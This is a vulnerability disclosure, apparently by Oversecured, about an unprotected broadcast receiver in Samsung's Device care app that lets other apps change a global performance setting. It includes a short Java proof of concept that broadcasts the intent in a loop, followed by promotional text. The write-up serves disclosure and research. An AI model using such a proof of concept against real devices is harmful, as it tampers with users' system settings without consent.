# Details

<table>
    <tr>
        <td>Name</td>
        <td>Device care</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.lool</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.09.20</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.12.06</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

Oversecured report:
![](Oversecured_report.png)

Oversecured found an unprotected dynamically registered receiver in the Device care app in the file `com/samsung/android/sm/enhancedcpu/ProcessingSpeedDcTileBridge.java`. It handles the `com.samsung.android.sm.ACTION_ENHANCED_PROCESSING_TILE` action and sets the global settings value `enhanced_processing` from the attacker-controlled `mode` value. When `mode` is 0 or 1, the value will be set to 0. When 2, it will be set to 1.

**Proof of Concept**

Setting `enhanced_processing` to 2 and `sem_enhanced_cpu_responsiveness` to 1.

```java
new Thread(() -> {
    Intent i = new Intent("com.samsung.android.sm.ACTION_ENHANCED_PROCESSING_TILE");
    i.setPackage("com.samsung.android.lool");
    i.putExtra("mode", 2);
    while (true) {
        sendBroadcast(i);
    }
}).start();
```

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.